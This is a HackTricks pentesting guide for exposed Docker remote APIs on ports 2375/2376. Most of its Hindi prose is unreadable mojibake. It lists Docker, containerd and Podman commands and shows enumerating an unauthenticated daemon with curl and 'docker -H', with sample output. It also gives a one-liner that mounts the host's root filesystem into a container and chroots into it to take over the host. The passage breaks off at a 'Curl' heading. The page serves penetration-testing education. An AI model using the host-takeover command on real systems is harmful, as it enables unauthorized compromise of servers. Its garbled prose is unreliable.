# 2375, 2376 Pentesting Docker

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


### Docker Basics

#### What is

Docker **рдХрдВрдЯреЗрдирд░рд╛рдЗрдЬреЗрд╢рди рдЙрджреНрдпреЛрдЧ** рдореЗрдВ **рдЕрдЧреНрд░рдгреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо** рд╣реИ, рдЬреЛ **рдирд┐рд░рдВрддрд░ рдирд╡рд╛рдЪрд╛рд░** рдХрд╛ рдиреЗрддреГрддреНрд╡ рдХрд░рддрд╛ рд╣реИред рдпрд╣ **рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╕реЗ рд▓реЗрдХрд░ рднрд╡рд┐рд╖реНрдпрд╡рд╛рджреА** рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рдирд┐рд░реНрдорд╛рдг рдФрд░ рд╡рд┐рддрд░рдг рдХреЛ рд╕рд░рд▓ рдмрдирд╛рддрд╛ рд╣реИ, рдФрд░ рд╡рд┐рднрд┐рдиреНрди рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рдЙрдирдХреЗ **рд╕реБрд░рдХреНрд╖рд┐рдд рддреИрдирд╛рддреА** рдХреА рд╕реБрдирд┐рд╢реНрдЪрд┐рддрддрд╛ рдХрд░рддрд╛ рд╣реИред

#### Basic docker architecture

* [**containerd**](http://containerd.io): рдпрд╣ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ **рдореБрдЦреНрдп рд░рдирдЯрд╛рдЗрдо** рд╣реИ, рдЬреЛ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЬреАрд╡рдирдЪрдХреНрд░ рдХрд╛ рд╡реНрдпрд╛рдкрдХ **рдкреНрд░рдмрдВрдзрди** рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ **рдЫрд╡рд┐ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдФрд░ рднрдВрдбрд╛рд░рдг** рдХреЗ рд╕рд╛рде-рд╕рд╛рде рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ **рдирд┐рд╖реНрдкрд╛рджрди, рдирд┐рдЧрд░рд╛рдиреА, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ** рдХрд╛ рдкреНрд░рдмрдВрдзрди рд╢рд╛рдорд┐рд▓ рд╣реИред рдХрдВрдЯреЗрдирд░рдб рдкрд░ **рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА** **рдЖрдЧреЗ рдЦреЛрдЬреА рдЧрдИ рд╣реИ**ред
* **container-shim** **рд╣реЗрдбрд▓реИрд╕ рдХрдВрдЯреЗрдирд░реЛрдВ** рдХреЗ рдкреНрд░рдмрдВрдзрди рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддрд╛ рд╣реИ, рдЬреЛ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рдкреНрд░рд╛рд░рдВрдн рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж **runc** рд╕реЗ рд╕рд╣рдЬрддрд╛ рд╕реЗ рдХрд╛рд░реНрдпрднрд╛рд░ рд╕рдВрднрд╛рд▓рддрд╛ рд╣реИред
* [**runc**](http://runc.io): рдЗрд╕рдХреЗ **рд╣рд▓реНрдХреЗ рдФрд░ рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ рдХрдВрдЯреЗрдирд░ рд░рдирдЯрд╛рдЗрдо** рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╕рд┐рджреНрдз, runc **OCI рдорд╛рдирдХ** рдХреЗ рд╕рд╛рде рд╕рдВрд░реЗрдЦрд┐рдд рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдВрдЯреЗрдирд░рдб рджреНрд╡рд╛рд░рд╛ **рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП **OCI рджрд┐рд╢рд╛рдирд┐рд░реНрджреЗрд╢реЛрдВ** рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдореВрд▓ **libcontainer** рд╕реЗ рд╡рд┐рдХрд╕рд┐рдд рд╣реБрдЖ рд╣реИред
* [**grpc**](http://www.grpc.io) **containerd** рдФрд░ **docker-engine** рдХреЗ рдмреАрдЪ **рд╕рдВрдЪрд╛рд░ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдЬреЛ **рдХреБрд╢рд▓ рдЗрдВрдЯрд░реИрдХреНрд╢рди** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИред
* [**OCI**](https://www.opencontainers.org) **рд░рдирдЯрд╛рдЗрдо рдФрд░ рдЫрд╡рд┐рдпреЛрдВ** рдХреЗ рд▓рд┐рдП **OCI рд╡рд┐рдирд┐рд░реНрджреЗрд╢реЛрдВ** рдХреЛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ, рдирд╡реАрдирддрдо Docker рд╕рдВрд╕реНрдХрд░рдг **OCI рдЫрд╡рд┐ рдФрд░ рд░рдирдЯрд╛рдЗрдо** рдорд╛рдирдХреЛрдВ рдХреЗ рд╕рд╛рде **рдЕрдиреБрд░реВрдк** рд╣реИрдВред

#### Basic commands
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ **Docker рдФрд░ Kubernetes** рдЬреИрд╕реЗ рдХрдВрдЯреЗрдирд░ рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдЗрд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╡рд┐рднрд┐рдиреНрди рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо, рдЬреИрд╕реЗ Linux, Windows, Solaris, рдФрд░ рдЕрдзрд┐рдХ рдореЗрдВ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ **рд╕рд░рд▓ рдмрдирд╛рдирд╛** рд╣реИ, рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЛ рдЕрдореВрд░реНрдд рдХрд░рдХреЗред Containerd рдХрд╛ рд▓рдХреНрд╖реНрдп рдХреЗрд╡рд▓ рдЙрди рдЖрд╡рд╢реНрдпрдХ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рд╣реИ рдЬреЛ рдЗрд╕рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВ, рдЕрдирд╛рд╡рд╢реНрдпрдХ рдШрдЯрдХреЛрдВ рдХреЛ рдЫреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реБрдПред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЗрд╕ рд▓рдХреНрд╖реНрдп рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЪреБрдиреМрддреАрдкреВрд░реНрдг рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

рдПрдХ рдкреНрд░рдореБрдЦ рдбрд┐рдЬрд╝рд╛рдЗрди рдирд┐рд░реНрдгрдп рдпрд╣ рд╣реИ рдХрд┐ **Containerd рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдХреЛ рд╕рдВрднрд╛рд▓рддрд╛ рдирд╣реАрдВ рд╣реИ**ред рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдХреЛ рд╡рд┐рддрд░рд┐рдд рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рддрддреНрд╡ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ (SDN) рдФрд░ рд╕реЗрд╡рд╛ рдЦреЛрдЬ рдЬреИрд╕реА рдЬрдЯрд┐рд▓рддрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреЛ рдПрдХ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рд╕реЗ рджреВрд╕рд░реЗ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдореЗрдВ рдХрд╛рдлреА рднрд┐рдиреНрди рд╣реЛрддреА рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, Containerd рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдкрд╣рд▓реБрдУрдВ рдХреЛ рдЙрди рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рд╡рд╣ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред

рдЬрдмрдХрд┐ **Docker рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП Containerd рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ**, рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ Containerd рдХреЗрд╡рд▓ Docker рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдПрдХ рдЙрдкрд╕рдореБрдЪреНрдЪрдп рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, Containerd рдореЗрдВ Docker рдореЗрдВ рдореМрдЬреВрдж рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░рдмрдВрдзрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдХрдореА рд╣реИ рдФрд░ рдпрд╣ рд╕реАрдзреЗ Docker рд╕реНрд╡рд╛рд░реНрдо рдмрдирд╛рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рднреЗрдж Containerd рдХреА рдПрдХ рдХрдВрдЯреЗрдирд░ рд░рдирдЯрд╛рдЗрдо рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдХреЗрдВрджреНрд░рд┐рдд рднреВрдорд┐рдХрд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЗрд╕рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдХреЛ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖реАрдХреГрдд рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдПрдБ рд╕реМрдВрдкрддрд╛ рд╣реИред
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** рдПрдХ рдУрдкрди-рд╕реЛрд░реНрд╕ рдХрдВрдЯреЗрдирд░ рдЗрдВрдЬрди рд╣реИ рдЬреЛ [Open Container Initiative (OCI) рдорд╛рдирдХреЛрдВ](https://github.com/opencontainers) рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ Red Hat рджреНрд╡рд╛рд░рд╛ рд╡рд┐рдХрд╕рд┐рдд рдФрд░ рдмрдирд╛рдП рд░рдЦрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ **daemonless architecture** рдФрд░ **rootless containers** рдХреЗ рд╕рдорд░реНрдерди рдХреЗ рд╕рд╛рде Docker рд╕реЗ рдХрдИ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЕрд▓рдЧ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрд┐рдирд╛ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред

Podman рдХреЛ Docker рдХреЗ API рдХреЗ рд╕рд╛рде рд╕рдВрдЧрдд рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ Docker CLI рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕рдВрдЧрддрддрд╛ рдЗрд╕рдХреЗ рдкрд╛рд░рд┐рд╕реНрдерд┐рддрд┐рдХреА рддрдВрддреНрд░ рддрдХ рдлреИрд▓реА рд╣реБрдИ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **Buildah** рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреЛ рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐рдпреЛрдВ рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ **Skopeo** рдЫрд╡рд┐ рд╕рдВрдЪрд╛рд▓рди рдЬреИрд╕реЗ рдкреБрд╢, рдкреБрд▓ рдФрд░ рдирд┐рд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рд╣реИрдВред рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЙрдирдХреЗ [GitHub рдкреГрд╖реНрда](https://github.com/containers/buildah/tree/master/docs/containertools) рдкрд░ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

**рдореБрдЦреНрдп рдЕрдВрддрд░**

* **рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░**: Docker рдХреЗ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд░реНрд╡рд░ рдореЙрдбрд▓ рдХреЗ рд╡рд┐рдкрд░реАрдд рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рдбреЗрдорди рд╣реЛрддрд╛ рд╣реИ, Podman рдмрд┐рдирд╛ рдбреЗрдорди рдХреЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдХрдВрдЯреЗрдирд░ рдЙрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рддреЗ рд╣реИрдВ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдиреЗ рд╢реБрд░реВ рдХрд┐рдП рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рддреА рд╣реИред
* **Systemd рдПрдХреАрдХрд░рдг**: Podman рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **systemd** рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ systemd рдЗрдХрд╛рдЗрдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдВрдЯреЗрдирд░ рдкреНрд░рдмрдВрдзрди рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ Docker рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рд╡рд┐рдкрд░реАрдд рд╣реИ, рдЬреЛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ Docker рдбреЗрдорди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП systemd рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
* **Rootless Containers**: Podman рдХреА рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рддрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рддрд╣рдд рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддрд╛ рд╣реИред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХрдВрдЯреЗрдирд░ рдЙрд▓реНрд▓рдВрдШрдиреЛрдВ рд╕реЗ рдЬреБрдбрд╝реЗ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗрд╡рд▓ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рди рдХрд┐ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ред

Podman рдХрд╛ рджреГрд╖реНрдЯрд┐рдХреЛрдг Docker рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдФрд░ рд▓рдЪреАрд▓рд╛ рд╡рд┐рдХрд▓реНрдк рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рдмрдВрдзрди рдФрд░ рдореМрдЬреВрджрд╛ Docker рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрдЧрддрддрд╛ рдкрд░ рдЬреЛрд░ рджреЗрддрд╛ рд╣реИред

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЪреВрдВрдХрд┐ podman рдХрд╛ рд▓рдХреНрд╖реНрдп docker рдХреЗ рд╕рдорд╛рди API рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдирд╛ рд╣реИ, рдЖрдк podman рдХреЗ рд╕рд╛рде рд╡рд╣реА рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ docker рдХреЗ рд╕рд╛рде рд╣реИрдВ рдЬреИрд╕реЗ:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

Remote API рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ 2375 рдкреЛрд░реНрдЯ рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдЬрдм рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╕реЗрд╡рд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд docker рдХрдВрдЯреЗрдирд░ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред Remote API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдИ рднреА рд╣реЛрд╕реНрдЯ / (рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛) рдХреЛ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╣реЛрд╕реНрдЯ рдХреЗ рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝/рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Enumeration

#### Manual

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ docker API рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк `docker` рдХрдорд╛рдВрдб рдпрд╛ `curl` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
рдпрджрд┐ рдЖрдк **`docker` рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рд░рд┐рдореЛрдЯ рдбреЙрдХрд░ API рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк **рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдХрд┐рд╕реА рднреА **рдбреЙрдХрд░** [**рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](2375-pentesting-docker.md#basic-commands)ред

{% hint style="info" %}
рдЖрдк `export DOCKER_HOST="tcp://localhost:2375"` рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **`-H`** рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ **рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

**рддреЗрдЬрд╝ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

